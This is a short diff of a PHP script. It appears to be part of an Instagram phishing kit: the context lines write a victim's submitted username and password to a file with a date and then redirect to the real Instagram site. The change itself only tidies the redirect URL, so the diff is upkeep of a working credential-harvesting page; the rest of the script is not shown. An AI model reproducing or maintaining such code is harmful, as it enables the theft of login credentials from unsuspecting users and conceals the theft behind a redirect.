@@ -12,7 +12,7 @@ $yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre." 
 fwrite($dosya, $yaz);
 fclose($dosya);
 
-header("Location: https://www.instagram.com//");
+header("Location: https://www.instagram.com/");
 die();
 
  ?>
